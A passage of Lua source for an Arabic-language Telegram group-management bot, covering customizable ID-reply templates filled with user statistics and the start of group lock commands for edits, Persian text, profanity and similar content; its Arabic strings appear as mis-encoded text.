if text and text:match("^ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§Ω$") or text and text:match("^ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§Ω$") or text and text:match("^ΨͺΨΉΩΩΩ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω$") then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ±Ψ¬Ψ§Ψ¦Ψ§ Ψ§ΨͺΨ¨ΨΉ Ψ§ΩΨͺΨΉΩΩΩΨ§Ψͺ ΩΩΨͺΨΉΩΩΩ \nβ β« ΩΨ·Ψ¨ΨΉ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ω ΨͺΨ­ΨͺΩΩ ΨΉΩΩ Ψ§ΩΩΨ΅ΩΨ΅ Ψ§ΩΨͺΩ Ψ¨Ψ§ΩΩΨΊΩ Ψ§ΩΨ§ΩΨ¬ΩΩΨ²ΩΩ Ψ§Ψ―ΩΨ§Ω β β₯‘\nββββ EB ββββ\n `#username` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΩΨΉΨ±Ω\n `#id` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ§ΩΨ―Ω \n `#photos` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ΅ΩΨ± \n `#stast` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ±ΨͺΨ¨ \n `#msgs` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω \n `#msgday` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΩΩΩΩ \n `#CustomTitle` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΩΩΨ¨ \n `#bio` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ¨Ψ§ΩΩ \n `#auto` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨͺΩΨ§ΨΉΩ \n `#game` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΩΩΨ§Ψ· \n `#cont` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ¬ΩΨ§Ψͺ \n `#edit` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ \n `#Description` β¬ ΩΨ·Ψ¨ΨΉ ΨͺΨΉΩΩΩ Ψ§ΩΨ΅ΩΨ±\nββββ EB ββββ', 1, 'md')
Devmfm:set("mustafa:New:id:"..mustafa..msg.sender_user_id_,'mustafaTEAM')
return "mustafaTEAM"
end
if text and Devmfm:get("mustafa:New:id:"..mustafa..msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω', 1, 'md')
Devmfm:del("mustafa:New:id:"..mustafa..msg.sender_user_id_)
return false
end
Devmfm:del("mustafa:New:id:"..mustafa..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§ΩΩ', 1, 'md')
Devmfm:set(mustafa.."mfm:AllIds:Text",text)
return false
end
if text and text:match("^Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§Ω$") or text and text:match("^ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§Ω$") or text and text:match("^Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω$") then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§ΩΩ")  
Devmfm:del(mustafa.."mfm:AllIds:Text")
end
end
--     Source Escobar     --
if text and text:match("^ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω$") and ChCheck(msg) or text and text:match("^ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω$") and ChCheck(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ±Ψ¬Ψ§Ψ¦Ψ§ Ψ§ΨͺΨ¨ΨΉ Ψ§ΩΨͺΨΉΩΩΩΨ§Ψͺ ΩΩΨͺΨΉΩΩΩ* \nβ β« ΩΨ·Ψ¨ΨΉ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ω ΨͺΨ­ΨͺΩΩ ΨΉΩΩ Ψ§ΩΩΨ΅ΩΨ΅ Ψ§ΩΨͺΩ Ψ¨Ψ§ΩΩΨΊΩ Ψ§ΩΨ§ΩΨ¬ΩΩΨ²ΩΩ Ψ§Ψ―ΩΨ§Ω β β₯‘\nββββ EB ββββ\n `#username` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΩΨΉΨ±Ω\n `#id` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ§ΩΨ―Ω \n `#photos` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ΅ΩΨ± \n `#stast` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ±ΨͺΨ¨ \n `#msgs` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω \n `#msgday` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΩΩΩΩ \n `#CustomTitle` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΩΩΨ¨ \n `#bio` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨ¨Ψ§ΩΩ \n `#auto` β¬ ΩΨ·Ψ¨ΨΉ Ψ§ΩΨͺΩΨ§ΨΉΩ \n `#game` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΩΩΨ§Ψ· \n `#cont` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ¬ΩΨ§Ψͺ \n `#edit` β¬ ΩΨ·Ψ¨ΨΉ ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ \n `#Description` β¬ ΩΨ·Ψ¨ΨΉ ΨͺΨΉΩΩΩ Ψ§ΩΨ΅ΩΨ±\nββββ EB ββββ', 1, 'md')
Devmfm:set("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_,'mustafaTEAM')
return "mustafaTEAM"
end
if text and Manager(msg) and Devmfm:get("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω', 1, 'md')
Devmfm:del("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_)
return false
end
Devmfm:del("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω', 1, 'md')
Devmfm:set(mustafa.."mfm:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω$") and ChCheck(msg) or text and text:match("^ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω")  
Devmfm:del(mustafa.."mfm:GpIds:Text"..msg.chat_id_)
end
end
--     Source Escobar     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^Ψ§ΩΨ―Ω$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function mustafaTEAM(extra,abbas,success)
if abbas.username_ then username = '@'..abbas.username_ else username = 'ΩΨ§ ΩΩΨ¬Ψ―' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'ΩΨ§ ΩΩΨ¬Ψ―' end
local function getpro(extra, abbas, success) 
local msgsday = Devmfm:get(mustafa..'mfm:UsersMsgs'..mustafa..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(Devmfm:get(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"ΩΩ Ψ΅ΩΨ±Ω ΨΈΩΩ Ψ¨Ψ§ΩΩΨ¨Ω Ψπ€€π","ΩΩΨͺΩΨΉ Ψ¨Ψ΅ΩΨ±ΨͺΩ !Ψ πΉπ€","ΩΩΨ§Ω ΩΩΨ§Ψ³ΩΩ Ψ¨ΩΨ±ΩΨ¨ΩΩ Ψπ€€π","ΩΩΨ§ΩΩΩ Ψπ€€π","ΩΨ΄Ψ?Ω Ψ¨Ψ±Ψ¨ Ψππ€","ΩΨ²ΩΨͺ Ψ¨ΩΩΨ§ Ψ―ΨΊΩΨ±ΩΨ§ ΨΉΨ§Ψ― Ψππ","Ψ΅ΩΨ±ΨͺΩ ΩΨ§ΩΨ±ΨͺΨ§Ψ­ΩΩΨ§ ΨππΆ","Ψ­ΩΨΊΩΩ ΩΨ§ΩΩΩ Ψπ₯Ίπ","ΩΩ Ψ΅ΩΨ±Ω ΨΊΩΨ¨ΩΩ Ψ¨Ψ±Ψ§Ψ³ΩΨ§ Ω¦Ω  Ψ­ΨΈ ΨπΉπ€"}
local Description = Texting[math.random(#Texting)]
if abbas.photos_[0] then
if not Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then 
if not Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then 
if Devmfm:get(mustafa.."mfm:AllIds:Text") then
newpicid = Devmfm:get(mustafa.."mfm:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#photos',(abbas.total_count_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#cont',(cont or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newpicid = newpicid:gsub('#Description',(Description or 'ΩΨ§ ΩΩΨ¬Ψ―'))
else
newpicid = "β β« "..Description.."\n*β β« ΩΩΨΉΩΩΰ’ͺΩΪͺ β * β¨ "..username.." β©\n*β β« Ψ’ΩΩ°ΪΩΪͺ β * β¨ "..msg.sender_user_id_.." β©\n*β β« Ωΰ’ͺΨͺΨ¨ΨͺΪͺ β * "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n*β β« Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ β * β¨ "..user_msgs.." β©\n*β β« Ψ³Ψ­ΩΪͺΨ’ΨͺΪͺ β * β¨ "..edit_msg.." β©\nβ β« ΨͺΩΩΨ’ΨΉΩΩΩΪͺ β "..formsgs(msguser).."\n*β β« ΩΩΨ’Ψ·Ϊͺ β * β¨ "..user_nkt.." β©\nββββ EB ββββ\n"
end 
if not Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#cont',(cont or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#Description',(Description or 'ΩΨ§ ΩΩΨ¬Ψ―'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if Devmfm:get(mustafa.."mfm:AllIds:Text") then
newallid = Devmfm:get(mustafa.."mfm:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#photos',(abbas.total_count_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
newallid = newallid:gsub('#game',(user_nkt or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#edit',(edit_msg or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#cont',(cont or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#msgday',(msgsday or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
newallid = newallid:gsub('#Description',(Description or 'ΩΨ§ ΩΩΨ¬Ψ―'))
else
newallid = "*β β« ΩΩΨΉΩΩΰ’ͺΩΪͺ β * β¨ "..username.." β©\n*β β« Ψ’ΩΩ°ΪΩΪͺ β * β¨ "..msg.sender_user_id_.." β©\n*β β« Ωΰ’ͺΨͺΨ¨ΨͺΪͺ β * "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n*β β« Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ β * β¨ "..user_msgs.." β©\n*β β« Ψ³Ψ­ΩΪͺΨ’ΨͺΪͺ β * β¨ "..edit_msg.." β©\n*β β« ΨͺΩΩΨ’ΨΉΩΩΩΪͺ β * "..formsgs(msguser).."\n*β β« ΩΩΨ’Ψ·Ϊͺ β * β¨ "..user_nkt.." β©"
end 
if not Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#cont',(cont or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
local new_id = new_id:gsub('#Description',(Description or 'ΩΨ§ ΩΩΨ¬Ψ―'))
Dev_mfm(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ Ψ§ΩΨ§ΩΨ―Ω ΩΩΨΉΩΨ·Ω ', 1, 'md')
end
else
if Devmfm:get(mustafa.."mfm:AllIds:Text") then
notpicid = Devmfm:get(mustafa.."mfm:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#photos',(abbas.total_count_ or 'ΩΨ§ ΩΩΨ¬Ψ―')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#cont',(cont or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ΩΨ§ ΩΩΨ¬Ψ―'))
notpicid = notpicid:gsub('#Description',(Description or 'ΩΨ§ ΩΩΨ¬Ψ―'))
else
notpicid = "*β β« ΩΨ§ Ψ’Ψ³Ϋ§ΨͺΨ·ΩΩ°ΨΉ ΨΉΩΰ’ͺΨΆ Ψ΅ΩΩΰ’ͺΨͺΪͺ ΩΨ’ΩΪͺ ΩΩΩΨͺ Ψ¨Ψ­ΩΨΆΩΰ’ͺ Ψ’ΩΨ¨ΩΨͺ Ψ’Ω Ψ’ΩΪͺ ΩΨ’ ΨͺΩΩΨͺΩΪͺ Ψ΅ΩΩΰ’ͺΩ ΩΩΩ° Ψ¨Ωΰ’ͺΩΩΨ’ΩΩ°ΩΪͺ *\nββββ EB ββββ\n*β β« ΩΩΨΉΩΩΰ’ͺΩΪͺ β * β¨ "..username.." β© π\n*β β« Ψ’ΩΩ°ΪΩΪͺ β * β¨ "..msg.sender_user_id_.." β© π\n*β β« Ωΰ’ͺΨͺΨ¨ΨͺΪͺ β * "..IdRank(msg.sender_user_id_, msg.chat_id_).." π\n*β β« Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ β * β¨ "..user_msgs.." β© π\n*β β« Ψ³Ψ­ΩΪͺΨ’ΨͺΪͺ β * β¨ "..edit_msg.." β© π\n*β β« ΨͺΩΩΨ’ΨΉΩΩΩΪͺ β * "..formsgs(msguser).." π\n*β β« ΩΩΨ’Ψ·Ϊͺ β * β¨ "..user_nkt.." β© π\nββββ EB ββββ\n"
end 
if not Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΩΩΨΉΩΩΰ’ͺΩΪͺ β * β¨ "..username.." β© π\n*β β« Ψ’ΩΩ°ΪΩΪͺ β * β¨ "..msg.sender_user_id_.." β© π\n*β β« Ωΰ’ͺΨͺΨ¨ΨͺΪͺ β * "..IdRank(msg.sender_user_id_, msg.chat_id_).." π\n*β β« Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ β * β¨ "..user_msgs.." β© π\n*β β« Ψ³Ψ­ΩΪͺΨ’ΨͺΪͺ β * β¨ "..edit_msg.." β© π\n*β β« Ωΰ’ͺΨ³Ϋ§Ψ’Ψ¦ΩΪͺ β * β¨ "..user_msgs.." β© π\n*β β« ΨͺΩΩΨ’ΨΉΩΩΩΪͺ β * "..formsgs(msguser).." π\n*β β« ΩΩΨ’Ψ·Ϊͺ β * β¨ "..user_nkt.." β© π", 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨΉΩΩΩΩΩΩΩΩΨ°Ψ±Ψ’ Ψ§ΩΨ§ΩΨ―Ω ΩΩΨΉΩΨ·Ω*', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, mustafaTEAM)
end
end 
--     Source Escobar     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^ΩΩΩ (.*)$") then
local LockText = {string.match(text, "^(ΩΩΩ) (.*)$")}
if LockText[2] == "Ψ§ΩΨͺΨΉΨ―ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨͺΨΉΨ―ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" or LockText[2] == "ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" then
if not Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§")  
Devmfm:set(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ" then
if not Devmfm:get(mustafa..'mfm:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ")  
Devmfm:set(mustafa..'mfm:Lock:Farsi'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨ΄Ψ§Ψ±" then
if Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨ΄Ψ§Ψ±")  
Devmfm:del(mustafa..'mfm:Lock:Fshar'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΨ΄Ψ§Ψ± Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩ" then
if Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω*")  
Devmfm:del(mustafa..'mfm:Lock:Taf'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΨ·Ψ§Ψ¦ΩΩΩΩ°Ω Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΩΨ±" then
if Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΩΨ±")  
Devmfm:del(mustafa..'mfm:Lock:Kfr'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« Ψ§ΩΩΩΨ± Ψ¨Ψ§ΩΩΨΉΩ ΩΩΩΩ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©*', 1, 'md')
end
end
if LockText[2] == "Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" then
if not Devmfm:get(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","*β β« ΨͺΩΩΩΩ ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―*")  
